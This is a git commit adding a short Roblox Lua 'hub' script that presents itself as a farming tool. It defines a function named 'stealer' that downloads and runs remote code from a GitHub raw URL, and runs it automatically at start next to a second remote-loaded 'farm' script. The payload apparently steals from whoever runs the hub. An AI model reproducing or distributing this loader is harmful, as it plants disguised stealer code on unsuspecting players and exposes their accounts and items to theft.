84588c8bfb08ea1573b9dda36ba8d8a6d91a3b03
killahub314 <casratlopnes@gmail.com>
2025-07-22 22:41:51 +0700

    Add files via upload

---
+++ beachballsHUB.lua
@@ -0,0 +1,9 @@
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/killahub314/MM2HUB/refs/heads/main/hayhay.lua'))()
+end
+local function farm()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/vantrv4k/vanscript/refs/heads/main/source.lua'))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
